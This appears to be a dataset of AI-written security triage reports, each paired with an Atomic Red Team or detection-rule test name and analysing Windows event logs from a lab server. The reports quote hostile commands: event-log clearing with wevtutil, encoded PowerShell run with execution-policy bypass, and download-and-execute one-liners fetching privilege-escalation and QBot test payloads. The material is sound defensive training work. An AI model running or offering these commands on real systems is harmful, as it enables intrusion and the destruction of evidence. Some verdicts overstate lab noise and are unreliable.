3. **Logon and User Activity**:
   - All suspicious activities seem to be tied to the user `SERVER002\admin_test`, who has a high integrity level, indicative of elevated privileges. 
   - The activities are clustered within a brief timeframe, which suggests a scripted or automated execution rather than typical administrative tasks.

4. **Integrity of Logs**:
   - Security logs contain an event indicating they were cleared (EventID 1102), further highlighting an attempt to erase traces of activities on the system.

5. **Contextual Concerns**:
   - The machine in question is identified as `Server002`, ostensibly a server hosting critical operations, and the user involved has domain-admin-like privileges which are evident from the log actions.
   - The actions taken are concentrated into a very short window of time, indicating a planned and rapid execution sequence attempting to leave minimal trace.

**Assessment:**

Based on the above points, there are strong indicators of malicious activity:
- Use of `wevtutil.exe` to clear logs and encoded PowerShell commands typically signal an attempt at covering tracks post-compromise.
- The log clearance across multiple channels denotes a conscious effort to obliterate records of any unauthorized or suspicious changes made during this timeframe.

**Resolution: MALICIOUS**

**Guidance on How to Proceed**:
1. **Immediate Containment**:
   - Isolate the affected host (Server002) to prevent lateral movement by the attacker.
   - Revoke or monitor closely the privileges/access for the user account `admin_test` across the network.

2. **Forensic Investigation**:
   - Preserve evidence by making full disk images of the compromised machine for detailed forensic analysis.
   - Analyze snapshots of memory and running processes during the time of the incident to identify further malware presence or data exfiltration tools used.

3. **Log Analysis and Restoration**:

BlackCat pre-encryption cmds with Lateral Movement,"Upon reviewing the provided event logs from the Windows host, several indicators stand out which point toward potentially malicious activity. Below is the detailed analysis:

### Suspicious and Anomalous Behaviors:
1. **Event Log Clearing**: There are multiple events in the logs indicating the clearing of logs, identified by EventID 1102 in the Security log, and EventID 104 in the System log. Notably, the user account `admin_test` is involved in the clearing of logs across multiple channels including `System` and `Windows PowerShell`. This action is suspicious as tampering with logs can be an attempt to cover tracks.

2. **Use of `wevtutil.exe`**: The frequent invocation of `wevtutil.exe`, a utility used to clear Windows event logs, is seen in the Sysmon logs. The command-line operations specifically include clearing the `Sysmon`, `Application`, `Security`, `System`, and `Windows PowerShell` logs. This is unusual and aligns with potential log tampering or clearing activity.

3. **PowerShell Script Execution**: A PowerShell script is logged with suspicious command sequences, including Windows Management Instrumentation Command-line (WMIC) and File System Utility Commands (`fsutil`) to modify system behaviors, as well as using `PsExec.exe` for accepting EULA and running remote commands. This kind of behavior is often associated with malicious operations, such as lateral movement or system enumeration.

4. **Presence of `PsExec`**: The use of `PsExec.exe` is logged, which is commonly leveraged by attackers for remote execution. It could signify attempts to spread laterally or execute commands on other systems in the network.

5. **High-Level Integrity Tasks**: Many of the commands executed in the logs have a high integrity level, showing that the processes opened may have administrative privileges. This level of access is often used for potent actions that can lead to privilege escalation or other security bypass attempts.

6. **Frequent Use of `conhost.exe`**: There are several instances of `conhost.exe` being spawned with a CIH 0xffffffff; this is typically benign. However, in combination with the other suspicious activities observed, it requires more context to confirm its benign nature.

### Indications of Malicious Activity:
- The combination of clearing logs, executing suspicious PowerShell commands, and using tools like PsExec aligns with tactics used in sophisticated attacks to maintain persistence, escalate privileges, and evade detection.

### Assessment:
Based on the analysis of these activities, the behavior seems aligned with tactics of evasion and privilege escalation commonly seen in intrusion and post-exploitation scenarios.

### Resolution:
**MALICIOUS**: The compilation of events, such as log clearing, PowerShell execution of potentially harmful scripts, and the use of administrative tools (e.g., PsExec), strongly suggests malicious intent and activity.

### Recommendations:
- **Immediate Containment**: Isolate the affected host (Server002) from the network to prevent any further potential spread of the threat.
- **Full Forensic Investigation**: Conduct a thorough inspection of Server002 to uncover any persistence mechanisms or additional compromised accounts.
- **Review Logs and System State**: Recover previously cleared logs if possible and analyze for any signs of data exfiltration or additional malicious actions.
- **Strengthen Security Posture**: Implement tighter controls on administrative tool usage, enhance logging and monitoring, and consider user education to prevent insider threats or compromised credentials. 

- **Incident Response**: Engage the incident response team to handle the potential compromise efficiently and document all findings for future preventive measures."
Cobalt Strike Lateral Movement (psexec_psh) pipe,"After a thorough analysis of the provided Windows event logs, the following observations are made:

1. **Event Log Clearance:**
   - Several event logs are noted where different log channels such as System, Security, Windows PowerShell, and Application logs have been cleared. This activity is extremely suspicious as it indicates potential log tampering to cover malicious activity that had occurred.

2. **Unusual Command-line Activity:**
   - The execution of `wevtutil.exe` with the `cl` (clear log) command was used to clear various log categories. This behavior was performed by the user 'SERVER002\\admin_test', indicating misuse of administrative privileges.
   - The presence of `cmd.exe` executing from `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..\\ExternalPayloads\\build\\namedpipes_executor.exe` suggests an execution of potentially malicious payloads disguised within temporary directories, indicative of techniques to evade detection.

3. **Execution of Suspicious Processes:**
   - Processes such as `namedpipes_executor.exe`, `namedpipes_server.exe`, and `namedpipes_client.exe` seen executing with command lines and file paths not typical for standard operations, which include path traversal attempts (`..\\`) suggesting tactics for obfuscation or payload execution in temporary directories.
   - The process `wsmprovhost.exe` is consistently seen as the parent of other suspicious tools, suggesting it may be used for persisting execution.

4. **High Integrity Levels:**
   - Processes executing with 'High' integrity levels demonstrate that actions were possibly taken under elevated privileges, raising the potential impact of the actions if they are indeed malicious.

5. **Microsoft Edge Update:**
   - Several logs indicate regular updates and executions associated with Microsoft Edge Update. These appear normal and align with expected behavior for automatic update services.

### Assessment
The logs reveal indications of potentially malicious activity, specifically the log-clearing events, unusual command-line executions, and presence of suspicious executables (e.g., `namedpipes` tools) in temporary directories, which are often tactics used in attack scenarios to persist, pivot, or evade detection.

### Resolution
**MALICIOUS** - The evidence of cleared Windows logs, the invocation of suspicious processes, and the use of potentially malicious scripts or executables (namedpipes tools) affirm that these logs reflect malicious activities.

### Guidance
- **Immediate Action**: Containment of the affected system (SERVER002) to prevent further compromise or spread.
- **Investigation**: Conduct deeper forensic analysis on SERVER002, examining the origin and timeline of suspicious activity, as well as other systems that may have been similarly affected.
- **Mitigation**: Consider implementing additional security controls such as stricter logging, enhanced EDR detection rules, and user behavior monitoring to identify and alert on similar activities.
- **Remediation**: Patch or reimage compromised systems and review user permissions and access logs to ensure that administrative privileges are tightly controlled and authorized only for legitimate use cases.

Taking these steps will help mitigate the potential damage from this incident and bolster overall security posture."
Office Generic Payload Download,"### Detailed Analysis of the Logs

#### Identified Suspicious/Anomalous Behavior:

1. **PowerShell Activity**:
   - The logs indicate Windows PowerShell being invoked with a complex command line. It uses `Net.ServicePointManager` to set the security protocol and executes a PowerShell script downloaded from a URL (`https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1`). This script is known from the Atomic Red Team project, which is used for simulating attack techniques and not typically used in benign situations.
   - The script fetched appears to execute a series of operations potentially simulating malicious document exploitation (Invoke-MalDoc), which can be concerning if executed without explicit permission or context.

2. **Event Logs Clearance**:
   - There are multiple instances where `wevtutil.exe` is used to clear event logs, including the Sysmon and Security logs. For example:
     - `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`
     - `wevtutil.exe cl Security`
     - `wevtutil.exe cl Application`
   - These actions are conducted by the `admin_test` user, which suggests an attempt to evade detection or cover tracks—this is a tactic often used during malicious activities.

3. **Clearing System and PowerShell Logs**: 
   - `wevtutil.exe` is also used to clear ""System"" and ""Windows PowerShell"" logs. This behavior is consistent with attempts to hide malicious activities.

4. **High Integrity Level**:
   - Many processes are executed at a high integrity level, suggesting administrative privileges, which can be leveraged by malicious actors to conduct unauthorized activities.

5. **Logon and User IDs**:
   - Activities like log clearance and PowerShell execution are executed by `SERVER002\\admin_test`, an admin user, which raises concerns if unauthorized.

6. **Microsoft Edge Update Activity**:
   - Numerous Microsoft Edge Update processes appear in logs, running under the NT AUTHORITY\SYSTEM—a normal service activity, but in the context of other suspicious activities, it merits closer investigation to exclude any tampering.

#### Assessment of the Situation:

- The combination of PowerShell activity fetching a potentially malicious script, coupled with deliberate clearing of event logs (Sysmon, Security, Application, System, and PowerShell) strongly indicates malicious behavior. These actions are characteristic of an intruder attempting to perform stealthy operations and cover their tracks, suggesting a compromised system.

#### Threats and Risks Identified:

- **Potential Compromise**: The system activities indicate a beyond-normal user behavior, where actions include downloading potentially harmful scripts and erasing critical event logs, possibly after executing unauthorized tasks.
- **Data Integrity Risks**: Such behaviors can compromise data integrity and availability if the malicious payload was executed.

### Guidance and Resolution

- **Resolution**: **MALICIOUS**
- **Recommended Actions**:
  1. **Immediate Isolation**: Isolate the affected system (Server002) from the network to prevent further potential spread or damage.
  2. **Forensic Investigation**: Conduct a detailed forensic analysis to determine the full extent of the compromise, checking for any data exfiltration or persistent backdoors.
  3. **Review and Reset Credentials**: Review and, if necessary, reset credentials for affected admin users to prevent further unauthorized access.
  4. **Patch and Update**: Ensure all systems are patched and updated, especially any vulnerabilities that may have been exploited.
  5. **Improve Monitoring**: Enhance monitoring for early detection of similar behaviors and implement better logging safeguards to prevent tampering.
  6. **Report and Remediate**: Report the incident as per internal procedures and take remedial action to strengthen security posture.

This analysis highlights indicators of an active threat and recommends swift and decisive action to mitigate risks."
Create a Process using obfuscated Win32_Process,"Upon reviewing the provided Windows event logs, several points of interest suggest potential malicious activity:

1. **Unusual PowerShell Activity:**
   - The PowerShell logs indicate the execution of a script that creates a new WMI class and attempts to execute `notepad.exe`. The use of `Invoke-WmiMethod` to create a new process is a known technique used by threat actors for stealthy process execution and is highly suspicious.

2. **Event Log Clearing:**
   - The system and PowerShell event logs have been cleared (Event ID 104 by `wevtutil.exe`), as well as the Security log (Event ID 1102 by the same process), evidenced by lines indicating ""LogFileCleared"". This is a common tactic used by attackers to cover their tracks.

3. **Process Execution and Sysmon Logs:**
   - Frequent executions of `wevtutil.exe` to clear logs (`cl System`,  `cl Application`, and `cl Security` channels) by the user `admin_test` indicates an unauthorized or malicious operation since it involves clearing critical logs.
   - Execution of `whoami.exe`, `hostname.exe`, and `notepad.exe` are likely part of information gathering and process injection or a test run by the attacker.

4. **Time Change Audit:**
   - Security and System logs note a time change event, which although it can be benign, in conjunction with other logs suggests an attempt to manipulate logs or timings for obfuscation purposes.

**Assessment:**
These logs present multiple red flags that are associated with malicious behavior. Specifically, the use of PowerShell to invoke WMI methods for process creation, log file clear operations using `wevtutil.exe`, and attempts to hide or manipulate timestamps in logs are techniques often observed in security breaches.

**Threat/Risk:**
- The user account `admin_test` is possibly compromised and is being used to execute these potentially malicious activities.
- The potential for ongoing unauthorized access and data exfiltration or further compromises should be considered.

**Guidance on How to Proceed:**
1. **Immediate Isolation and Investigation:**
   - Isolate the host from the network to prevent further damage or exfiltration.
   - Investigate the user account `admin_test` for unauthorized activity and possible credential exposure.

2. **Incident Response and Forensics:**
   - Conduct a full forensic analysis of the affected machine to understand the scope of the intrusion.
   - Check network logs for any unusual outgoing connections or data transfers during the time of these activities.

3. **Remediation and Recovery:**
   - Reset and strengthen credentials for potentially compromised accounts.
   - Review system configurations and enforce policies that restrict the use of PowerShell and WMI methods to only trusted scripts and applications.

4. **Review Security Policies:**
   - Implement enhanced monitoring and alerting for PowerShell and WMI activity.
   - Conduct a full security review to evaluate potential gaps that allowed such an intrusion.

**Resolution: MALICIOUS**
This level of manipulation and stealth points towards malicious intent, warranting immediate action to investigate and mitigate potential threats within the network."
Create a Process using WMI Query and an Encoded Command,"### Analysis of the Windows Event Logs:

**Suspicious or Anomalous Behavior:**

1. **Clearing of Event Logs:**
   - Multiple instances where `wevtutil.exe`, a utility used to manage event logs, is executed:
     - Execution of the command `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, `cl Security`, and `cl ""Windows PowerShell""`.
   - Corresponding events in the System and Security logs indicate that the logs were indeed cleared by the user `SERVER002\admin_test`.

2. **Encoded PowerShell Command:**
   - A `cmd.exe` execution running a suspicious encoded PowerShell command with `-exec bypass` option:
     - `powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA`
   - The use of encoded commands is a common tactic used by attackers to obfuscate payloads and avoid detection.

3. **Time Manipulation:**
   - Events in both the System and Security logs show the system time was manipulated:
     - Time was adjusted backwards, which may help cover tracks of malicious activities or to evade detections based on timestamps.

**Indicators of Malicious Activity or Compromise:**

- **Log Clearing:** Frequent log clearing, particularly of security-relevant logs, is a strong indicator of an attempt to hide malicious activity.
- **Encoded PowerShell Activity:** The execution of an encoded PowerShell command with `-exec bypass` is typically used to avoid execution policy restrictions, which is suspicious behavior associated with potential malware or intrusion activity.
- **Time Change Events:** Changing the system time could disrupt log creation or alerting mechanisms based on time, further indicating an attempt to cover tracks.

### Assessment:

Given the patterns of behavior, particularly the clearing of logs, execution of potentially malicious PowerShell commands, and manipulation of system time, there is a high likelihood of compromise. This combination of activities strongly indicates an attempt to evade detection and is consistent with post-exploitation tactics.

### Guidance and Next Steps:

1. **Immediate Response:**
   - Isolate the affected machine (SERVER002) from the network to prevent further actions by the attacker and preserve any potential evidence.
   - Notify the incident response team and the relevant stakeholders, including the CEO, given the sensitivity of the machine in question.

2. **Further Investigation:**
   - Conduct a comprehensive forensic analysis to determine the full scope and method of the compromise.
   - Review user activity, installed tools, and potentially modified files for further malicious indicators or data exfiltration.

3. **Remediation and Hardening:**
   - Restore affected systems from known good backups and apply security patches.
   - Implement tighter monitoring and alerting systems for execution of encoded scripts and unexpected log-cleaning activities.
   - Review and harden account privileges, particularly for the `admin_test` account involved.

### Resolution:

- **MALICIOUS**: The logs clearly indicate malicious activity, including attempts to cover tracks and potentially execute stealthy malicious scripts. Immediate action is required to address the compromise."
WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique,"Upon reviewing the provided Windows event logs, several indicators suggest malicious activity. Here is the detailed analysis broken down by various indicators and patterns observed in the logs:

1. **Clearing of Event Logs**:
   - There are multiple entries (EventID 1102 in Security log and EventID 104 in System log) indicating that the event logs were cleared by the user `admin_test`. The use of the `wevtutil.exe` command to clear logs is a method often used by attackers to cover their tracks after gaining unauthorized access or performing unauthorized actions on a system.

2. **Suspicious PowerShell Activity**:
   - Several PowerShell events (EventID 600 in Windows PowerShell log) indicate the execution of a PowerShell script that downloads and executes a script from a GitHub URL: `https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1`. This script is known to be associated with privilege escalation techniques using named pipes. Using `iex(new-object net.webclient).downloadstring()` to execute remote scripts is highly suspicious and potentially malicious.

3. **Service Creation and Execution**:
   - A new service named `svcHighPriv` was created with a command-line using `cmd.exe` to echo data to a named pipe. This is captured in the System log as EventID 7045. Such behavior is consistent with establishing persistence or enabling privilege escalation.

4. **Process Creation via Sysmon Logs**:
   - Multiple entries in the Sysmon log indicate the creation of processes related to the above PowerShell and command-line executions. Notably, `csc.exe` and `cvtres.exe` processes, associated with compiling .NET projects, suggest possible execution of a compiled payload, often observed in malicious frameworks.

5. **Privileges and Elevated Actions**:
   - EventID 4672 in the Security log indicates the use of a process with significant privileges (`SeDebugPrivilege`, among others), typically utilized during privilege escalation attempts.

Given the evidence provided, the activity within these logs strongly indicates malicious intent, particularly focused on privilege escalation and evasion tactics. Clearing logs, executing remote PowerShell scripts, and creating non-standard services are traditional malicious actions aiming to gain control over the system and hide activities.

**Resolution: MALICIOUS**

**Recommended Actions**:
- Immediately isolate the affected host (`Server002`) from the network to prevent the spread of potential compromise.
- Reset all passwords for accounts that were observed or potentially impacted, especially `admin_test`.
- Conduct a full forensic investigation on the host to identify any additional payloads, backdoors, or persistence mechanisms.
- Review and tighten security policies and controls around PowerShell execution, remote script executions, and event log management.
- Consider implementing enhanced monitoring and threat detection solutions to better detect similar activities in the future."
WMI Reconnaissance Software,"Upon reviewing the provided Windows event logs, here is a detailed analysis of the events:

### Key Findings:

1. **Event Log Clearance:**
   - The `wevtutil.exe` command-line utility is observed in the Sysmon logs where it was used to clear several event logs including Application (`""wevtutil.exe"" cl Application`), System (`""wevtutil.exe"" cl System`), Security (`""wevtutil.exe"" cl Security`), and Windows PowerShell (`""wevtutil.exe"" cl ""Windows PowerShell""`).
   - Event ID 1102 in the Security log indicates that the security log was cleared on `2024-10-22 15:02:32`. This action was performed by the user `SERVER002\admin_test`.
   - Event ID 104 in the System log confirms the application, system, and PowerShell logs were also cleared by `admin_test` in similar timestamps.

2. **Time Manipulation:**
   - Multiple Event ID 4616 from the Security log indicate a suspicious change in the system time. The earlier time was `2024-10-22 15:02:33.6886832`, but it was set back to `2024-10-22 15:02:09.8215892`. This action was performed by process `svchost.exe` running under `LOCAL SERVICE`.

3. **Use of High-Risk Command-line Tools:**
   - The usage of tools such as `wevtutil.exe` and `wmic.exe` from the command line `(""cmd.exe"" /c wmic qfe get description,installedOn /format:csv)` is indicative of actions that are frequently employed during malicious operations to gather system information, and modify or cover tracks by clearing logs.

### Assessment:
- The clearing of event logs, especially the Security log, is generally associated with attempts to cover tracks of unauthorized or malicious activities.
- The manipulation of system time can be used to disrupt log continuity and obfuscate actual event sequences.
- Use of `wevtutil.exe` to clear logs combined with time changes strongly suggests that an actor attempted to conduct operations stealthily, possibly with malicious intent.

### Conclusion:
In light of the above findings, the resolution is categorized as **MALICIOUS**. The combination of log clearance, time manipulation, and tool usage indicates activities aiming to hide unauthorized actions or compromise integrity, marking clear indications of potentially malicious behavior.

### Recommended Actions:
1. **Immediate Containment**: Restrict access to the affected machine and network segments to prevent further damage.
2. **Forensics Analysis**: Collect memory images and network traffic data for in-depth forensic analysis.
3. **User Review**: Review `admin_test` user account activity for anomalies and ensure its credentials are secure.
4. **System Time Verification**: Verify system time is correctly synchronized with an accurate time source.
5. **Log Monitoring and Retention**: Enhance monitoring and retention policies for critical logs to quickly detect and address any such incidents in the future.
6. **Security Policies**: Update security policies to mitigate unauthorized clearances of event logs by employing techniques such as forwarding logs to a secure server or implementing more restrictive permissions on the usage of tools like `wevtutil`."
ATHPowerShellCommandLineParameter -EncodedCommand parameter variations,"Upon analyzing the provided Windows event logs, the following suspicious activities have been identified:

1. **Use of PowerShell and Wevtutil**:
   - There are multiple instances of PowerShell execution on the system (e.g., `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`). While PowerShell is a legitimate administrator tool, its frequent execution, especially with the command ""EncodedCommand"" (which is usually a sign of script execution with potentially obfuscated/malicious content), raises suspicion. 
   - The repeated commands to clear logs via `wevtutil` (e.g., `C:\\Windows\\System32\\wevtutil.exe cl Application`) are usually indicative of an attempt to cover tracks, as it involves clearing various Windows event logs. This activity is typically associated with post-exploitation behavior to prevent detection.

2. **Clearing of Event Logs**:
   - Logs indicate that the security, system, and Windows PowerShell logs have been cleared by the user `admin_test`. Clearing event logs is a red flag in any security incident as it suggests an attempt to erase evidence of certain activities.

3. **High Integrity Levels**:
   - The processes run with a high integrity level, signifying privileged execution, which suggests execution by an account with administrative privileges. 

4. **Frequent Use of `conhost.exe`**:
   - The frequent spawning of `conhost.exe` is associated with command-line executions. While it is typically benign, its occurrence as a parent to suspicious activities warrants further scrutiny.

5. **Interaction with System Utilities**:
   - Commands executed include system utilities like `whoami.exe` and `hostname.exe`, which gather information about the host environment and user context. These, combined with clearing records, suggest reconnaissance activity.

6. **Use of WMI Provider‌ Host**:
   - `C:\\Windows\\System32\\wsmprovhost.exe` being used often indicates potential for remote execution capabilities over WMI.

Based on these observations, particularly the pattern of behavior including the clearing of logs and execution of encoded PowerShell commands, it can be concluded that the logs reveal unauthorized or malicious activity intended to obfuscate further actions of a potential compromise. 

**Resolution**: **MALICIOUS**

**Guidance on How to Proceed**:
- Conduct a full forensic analysis of the machine using a snapshot or a forensic image.
- Investigate additional log sources, network logs, and consider auditing systems for further corroborating evidence of lateral movement or data exfiltration.
- Isolate the machine from the network to prevent further potential compromise or data exfiltration.
- Consider changing credentials for accounts used on this system, as they may have been compromised.
- Implement enhanced monitoring and detection rules on PowerShell usage, especially focusing on encoded command executions, and configure alerting for event log clearing activities."

### Final Resolution

**MALICIOUS** - Based on the execution of known adversary simulation scripts and evidence of log tampering to cover tracks, the activity is assessed as malicious."
Malicious Execution from Mounted ISO Image,"Upon reviewing the logs from the Windows host, I have identified a series of activities that are notably suspicious and potentially indicate malicious activity:

**Suspicious Behavior:**

- **PowerShell Activity:** A PowerShell command executed with the following suspicious behavior:
  - The command involved downloading a file (`qbot-test.iso`) from an external source (`https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.003/src/qbot-test.iso`).
  - The file was then mounted as a disk image and executed (`calc.exe.lnk`), which is highly suggestive of a potentially malicious operation likely related to executing unwanted software or a payload.

- **Event Log Clearing:** There are events (e.g., Security event ID 1102 and System event ID 104) showing the clearing of logs by the user `admin_test`. Log clearing is a tactic used by malicious actors to hide their tracks.

- **Sysmon Activity:** Multiple references to legitimate processes such as `wevtutil.exe`, `cmd.exe`, and `whoami.exe`. These, in isolation, might not indicate compromise, but given the context of PowerShell execution and log clearance, they could suggest privilege escalation or lateral movement attempts. Notably, `wevtutil.exe` was used to clear logs.

**Indicators of Potential Compromise:**

- The sequence of PowerShell commands aligns with known tactics for executing scripts or applications in a stealthy manner without raising alarms using image mount techniques.
- The behavior suggests an attempt to introduce an unauthorized application onto the system, a common strategy among malware like QBot, which is also referenced in the script download URL.
- The deliberate clearing of logs further supports suspicious and potentially malicious intent, reinforcing the need for additional scrutiny.

**Assessment:**
Based on these findings, the behavior observed in the logs is suspicious. It warrants further investigation to confirm whether a compromise has occurred. While malicious intent is suspected due to the nature of the activities, additional context such as network traffic, user intent, or sandbox analysis of the downloaded .iso would help in making a definitive conclusion.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
1. **Quarantine the Affected System:** This will prevent further potential breach, communication with C2 servers, or lateral movement.
2. **Conduct a Detailed Forensic Analysis:** Investigate the PowerShell session, network connections, and any resultant files or processes that may have executed.
3. **Review User Activity:** Validate whether the actions taken were legitimate, and if not, identify how the user's credentials were potentially compromised.
4. **Monitor for Further Indicators:** Set up enhanced monitoring for the indicators outlined and any subsequent suspicious activity, particularly focusing on similar PowerShell executions or external downloads.
5. **Notify and Collaborate with Incident Response Teams:** Engage your internal incident response team and potentially relevant external cybersecurity agencies to evaluate and mitigate the identified threat.

Conclusively, the indicators merit deeper investigation and immediate action to ensure the integrity of the network and systems."
Cobalt Strike Artifact Kit pipe,"Upon analyzing the logs provided, I have identified several behaviors indicative of potentially malicious or at least suspicious activities. The following points outline key observations from the logs:

1. **Systematic Event Log Clearing**:
    - Numerous event logs were cleared, which is a common tactic used by malicious actors to hide their traces. Logs were cleared from the System, Security, and Windows PowerShell channels.
    - The clearing was performed by the user ""SERVER002\\admin_test,"" which is concerning.

2. **Usage of `wevtutil.exe`**:
    - The process `wevtutil.exe` (Eventing Command Line Utility) was invoked multiple times with the command to clear logs from various channels, suggesting an intent to cover tracks:
      - Command: `""C:\\Windows\\system32\\wevtutil.exe"" cl Application`
      - Command: `""C:\\Windows\\system32\\wevtutil.exe"" cl Security`
      - Command: `""C:\\Windows\\system32\\wevtutil.exe"" cl ""Windows PowerShell""`

3. **External Payloads Execution**:
    - The execution of `cmd.exe` with a command referencing `AtomicRedTeam` and `namedpipes_executor.exe` is notable. Atomic Red Team is a known framework for testing security measures, and the context here (temp folders and external payloads) raises suspicions:
      - Command: `""cmd.exe"" /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\build\\namedpipes_executor.exe"" --pipe 1`

4. **Use of Administrative Privileges**:
    - The user ""SERVER002\\admin_test"" had high levels of access and integrity, which were leveraged to perform potentially unauthorized activities.
    - Several processes, including `wevtutil.exe` and `conhost.exe`, were executed with elevated privileges.

5. **Running Processes from Temp Directories**:
    - Running executables from temporary directories is often a red flag, especially files related to `namepipes_executor.exe` and `namepipes_client.exe`.

6. **No Windows PowerShell Event Logs**:
    - The absence of PowerShell logs in the provided data could indicate they were cleared to mask any command execution via PowerShell scripts.

From the analysis:
- The combination of log clearing, suspicious execution of payloads, and high-level access suggests that the activity is not benign.
- The evidence points to well-coordinated actions that could be part of a post-exploitation phase or security testing without proper authorization.

**Assessment**: These activities are characterized as highly suspicious and potentially malicious. They warrant further investigation to determine the intent behind these actions and ensure that no unauthorized exploitation of the system is ongoing.

**Resolution**: **MALICIOUS**

**Guidance on How to Proceed**:
- Conduct an in-depth forensic investigation to trace the origin and intent of these activities.
- Review any possible unauthorized access to the ""admin_test"" account and verify if this behavior was sanctioned.
- Consider isolating the machine to prevent potential lateral movement across the network.
- Reinforce auditing and logging mechanisms to prevent future manipulation.
- Engage with legal or compliance teams to understand the ramifications of such activities within the organization."
Pipe Creation - PsExec Tool Execution From Suspicious Locations,"Upon reviewing the provided Windows event logs, the following suspicious or potentially malicious activities are identified:

1. **Clearing of Event Logs**:
   - From the System and Security logs, the event ID 104 (System) and 1102 (Security) indicate that event logs were cleared by a user with the username ""admin_test."" Clearing event logs can be a significant indication of malicious intent, as it is often performed to cover tracks after unauthorized access or malicious activity.

2. **Use of PsExec**:
   - PsExec was utilized as seen in the system logs where the service ""PSEXESVC"" was added (event ID 7045) and in Sysmon logs where PsExec.exe was executed. PsExec is a legitimate administrative tool often used for remote command execution but can be abused by attackers for lateral movement and executing commands with elevated privileges.

3. **Suspicious PowerShell Activity**:
   - The PowerShell logs show abnormal command lines such as `powershell.exe & {cd C:\\Users\\Public\\Temp\\ , .\\PsExec.exe -i -s cmd -accepteula}`, suggesting unauthorized execution of commands that include the use of PsExec. This is a highly suspicious activity since PowerShell is often leveraged for executing scripts or commands for system exploration or modifications during an attack.

4. **Privilege Escalation Observations**:
   - The Security logs indicate multiple successful logins and privilege escalation events (Event ID 4672) where admin_test was granted a wide range of privileges, which could include SeDebugPrivilege and SeTakeOwnershipPrivilege. This suggests potential unauthorized privilege escalation.

5. **Anomalous External Observations**:
   - Several login attempts from an NTLM Authentication Package using logon type 3 indicate network logons from an external source or potentially remote desktop usage, correlated with high-privilege access (event ID 4624 and 4672).
   
6. **Execution of Wevtutil**:
   - The Sysmon logs indicate the execution of `wevtutil.exe` with the command line clearing application logs. Wevtutil is a command-line utility for managing event logs and clearing logs via such commands is suspicious.

### Assessment and Guidance:

The logs give a strong indication of potential unauthorized activities including privilege escalation, log tampering, and the use of tools like PsExec for potentially malicious actions. 

- **Resolution**: **MALICIOUS** - The activities captured in the logs, including log clearance, use of PsExec, and suspicious PowerShell executions signify a strong likelihood of malicious behavior and potential compromise of the system.

### Recommended Actions:

1. **Immediate Investigation**:
   - Conduct a thorough audit of the user ""admin_test"" to verify identity and activities.
   - Investigate the source IP (fe80::e3b5:5371:12a8:9c77) used for the NTLM logon events.
   - Assess the integrity of the system for any unauthorized changes or backdoors.

2. **Containment**:
   - Isolate the affected system (Server002) from the network to prevent any further malicious activity or lateral movement.
   - Change all passwords associated with the high-privilege accounts and ensure they follow best practices for complexity and uniqueness.

3. **Forensic Analysis**:
   - Collect and analyze memory dumps, system snapshots, and other relevant artifacts for deeper forensic analysis.
   - Review other endpoints for similar artifacts and behavior patterns to identify potential spread.

4. **Review and Harden Security Policies**:
   - Implement strict logging policies to monitor and alert on suspicious activities such as log clearance, execution of system utilities like wevtutil, and unauthorized use of administrative tools.
   - Configure the environment to limit the use of high-risk tools like PsExec and PowerShell by enforcing execution policies and using application whitelisting.

Proceed with caution and confirm the findings with further detailed forensic investigation."
Cobalt Strike post-exploitation pipe (4.2 and later),"To analyze the Windows event logs provided, let us consider the suspicious behaviors that stand out:

### Suspicious Behaviors:

1. **Clearing of Event Logs:**
   - The logs show multiple instances of event logs being cleared (Event ID 1102 from Security log and Event ID 104 for System and Windows PowerShell logs) executed by the user `admin_test`. 
   - Clearing event logs is not a typical action for normal operations, especially without immediately obvious legitimate reasons, and could indicate an attempt to cover tracks.

2. **High-Privilege Utilization:**
   - Event ID 4672 shows that the user `admin_test` is obtaining special privileges, including `SeDebugPrivilege`, `SeSecurityPrivilege`, etc., which are typically required for sensitive operations. 
   - The combination of privilege assignment followed by log clearance can suggest malicious intent.

3. **Execution of Unusual Commands:**
   - The logs show use of the `wevtutil.exe` command to clear logs in the command line. 
   - The use of `cmd.exe` to execute a potentially suspicious executable, `namedpipes_executor.exe`, from a temporary directory indicates potentially malicious activities. This type of behavior is common in lateral movement or persistence techniques in an attack chain.

4. **Temporal and Contextual Anomalies:**
   - The suspicious activities occur in a closely packed timeframe, reinforcing the possibility of coordinated unauthorized activity.
   - Processes related to network services and named pipes seem to be executing unexpectedly, suggesting a test or exploit scenario.

5. **Tools Related to Testing/Simulating Attacks:**
   - The presence of `AtomicRedTeam` in the command line arguments is indicative of a security testing or a simulated attack scenario. However, without clear authorization, the presence of such tools on an executive's machine is concerning.

### Assessment:

Given these observations, the system appears compromised, and these entries indicate attempts by an unauthorized or malicious actor to conceal activity and execute unauthorized commands potentially related to further attacks or persistence mechanisms.

### Identified Threats or Risks:

- Potential privilege escalation attempts and use of advanced privileges by a non-trusted entity.
- Clearing of event logs indicating potential covering of tracks by the attacker.
- Execution of unauthorized or suspicious script/executable files from temporary directories.

### Recommended Actions:

1. **Resolution: MALICIOUS**

2. **Immediate Actions:**
   - Isolate the machine on the network to prevent further spread of any potential attacks.
   - Engage with the incident response team immediately for forensic investigation.
   - Ensure any critical information that could aid the attack is no longer accessible.
   - Notify relevant stakeholders of a potential compromise.

3. **Investigative Actions:**
   - Analyze further surrounding logs for any lateral movement or further indicators of compromise.
   - Validate recent access and account activity logs for further unauthorized access or privilege escalation.
   - Assess whether files or data have been exfiltrated or manipulated.

4. **Prevention and Hardening:**
   - Re-evaluate security policies, especially relating to access control and logging.
   - Implement additional monitoring mechanisms to detect similar activities in the future.
